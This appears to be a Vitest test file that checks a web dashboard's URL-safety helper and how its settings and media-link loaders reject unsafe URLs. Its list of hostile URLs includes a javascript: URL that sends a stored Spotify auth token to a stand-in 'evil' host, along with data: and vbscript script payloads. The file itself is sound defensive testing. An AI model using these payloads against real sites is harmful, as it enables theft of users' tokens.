import { afterEach, describe, expect, it } from 'vitest'
import { isSafeHttpUrl, safeHttpUrlOr } from '../urlSafety'
import { importSettings, loadSettings } from '../settings'
import { normalizeSavedMediaLinks } from '../mediaLinks'

const HOSTILE_URLS = [
  "javascript:fetch('//evil?'+localStorage.dayboard_spotify_auth)",
  ' JavaScript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
  'not a url',
]

describe('isSafeHttpUrl', () => {
  it('accepts http and https URLs', () => {
    expect(isSafeHttpUrl('https://music.apple.com/us/album/x/1')).toBe(true)
    expect(isSafeHttpUrl(' http://example.com ')).toBe(true)
  })

  it.each(HOSTILE_URLS)('rejects %s', (value) => {
    expect(isSafeHttpUrl(value)).toBe(false)
  })

  it('rejects non-strings', () => {
    expect(isSafeHttpUrl(undefined)).toBe(false)
    expect(isSafeHttpUrl(42)).toBe(false)
  })

  it('falls back for unsafe values', () => {
    expect(safeHttpUrlOr('javascript:alert(1)', 'https://music.apple.com/')).toBe('https://music.apple.com/')
    expect(safeHttpUrlOr(' https://a.com/x ', 'https://b.com/')).toBe('https://a.com/x')
  })
})

describe('unsafe URLs in stored and imported data', () => {
  afterEach(() => {
    localStorage.clear()
  })

  it('drops unsafe embed URLs from stored settings', () => {
    localStorage.setItem(
      'dayboard:settings',
      JSON.stringify({
        appleMusicEmbedUrl: HOSTILE_URLS[0],
        applePodcastEmbedUrl: 'data:text/html,x',
        spotifyEmbedUrl: 'https://open.spotify.com/track/abc',
      }),
    )

    const settings = loadSettings()
    expect(settings.appleMusicEmbedUrl).toBe('')
    expect(settings.applePodcastEmbedUrl).toBe('')
    expect(settings.spotifyEmbedUrl).toBe('https://open.spotify.com/track/abc')
  })

  it('drops unsafe embed URLs from imported settings', () => {
    const imported = importSettings(JSON.stringify({ appleMusicEmbedUrl: HOSTILE_URLS[0] }))
    expect(imported?.appleMusicEmbedUrl ?? '').toBe('')
  })

  it('drops unsafe saved media links', () => {
    const links = normalizeSavedMediaLinks([
      { url: HOSTILE_URLS[0], title: 'Evil' },
      'javascript:alert(1)',
      { url: 'https://music.apple.com/us/album/x/1', title: 'Album' },
    ])

    expect(links.map((link) => link.url)).toEqual(['https://music.apple.com/us/album/x/1'])
  })
})
